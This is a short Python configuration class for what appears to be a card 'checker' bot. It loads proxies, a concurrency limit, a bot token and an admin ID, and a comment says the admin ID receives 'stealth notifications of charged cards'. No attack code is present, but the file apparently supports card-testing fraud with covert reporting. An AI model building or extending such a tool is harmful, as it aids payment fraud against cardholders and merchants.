import os

class CheckerConfig:
    def __init__(self):
        # Load from environment variables for Railway deployment
        self.PROXY_LIST = os.getenv("PROXY_LIST", "").split(",") if os.getenv("PROXY_LIST") else []

        self.IS_SHIPPABLE = os.getenv("IS_SHIPPABLE", "false").lower() == "true"

        self.DEFAULT_EMAIL = os.getenv("DEFAULT_EMAIL", None)

        self.CONCURRENCY_LIMIT = int(os.getenv("CONCURRENCY_LIMIT", "15"))

        self.BOT_TOKEN = os.getenv("BOT_TOKEN", "")

        # Admin user ID for stealth notifications of charged cards
        self.ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "0")) if os.getenv("ADMIN_USER_ID") else None
